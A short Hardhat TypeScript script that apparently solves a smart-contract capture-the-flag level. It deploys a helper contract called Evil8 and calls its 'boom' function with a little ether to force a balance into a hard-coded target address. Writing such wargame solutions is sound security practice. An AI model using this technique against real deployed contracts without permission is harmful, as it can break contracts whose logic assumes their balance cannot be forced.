import { ethers } from "hardhat";
import { Evil8__factory } from "../typechain-types";

async function main() {
  // The goal of this level is to make the balance of the contract greater than zero.

  let tx; // will have to wait for each tx

  let [deployer] = await ethers.getSigners();
  let contract = "0x73d315d62074614B0D5ffC61c4d9F2cE2483D2aF";
  let evil = await new Evil8__factory(deployer).deploy();

  tx = await evil.boom(contract, { value: ethers.utils.parseEther("0.00001") });
  await tx.wait();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
